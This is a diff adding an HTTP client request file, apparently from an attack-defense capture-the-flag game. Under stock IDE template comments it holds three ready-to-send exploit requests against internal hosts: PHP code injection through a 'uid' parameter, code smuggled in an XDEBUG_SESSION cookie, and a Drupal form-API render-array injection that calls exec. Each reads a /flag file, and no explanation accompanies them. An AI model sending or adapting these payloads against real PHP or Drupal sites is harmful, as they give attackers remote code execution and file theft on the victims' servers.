@@ -1,0 +1,25 @@
+# For a quick start check out our HTTP Requests collection (Tools|HTTP Client|Open HTTP Requests Collection).
+#
+# Following HTTP Request Live Templates are available:
+# * 'gtrp' and 'gtr' create a GET request with or without query parameters;
+# * 'ptr' and 'ptrp' create a POST request with a simple or parameter-like body;
+# * 'mptr' and 'fptr' create a POST request to submit a form with a text or file field (multipart/form-data);
+
+POST http://172.16.5.14:5072/statistics.php
+Connection: close
+
+uid=print_r(file_get_contents("/flag"));
+
+###
+
+GET http://172.16.5.45:5072/modules/simpletest/drupal_web_test_case.php
+Cookie: XDEBUG_SESSION=echo file_get_contents("/flag");
+Connection: close
+
+###
+
+POST http://172.16.5.60:5066/index.php?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=exec&name%5B%23type%5D=markup&name%5B%23markup%5D=head+%2Fflag
+_triggering_element_name=name&form_id=user_pass
+Connection: close
+
+###
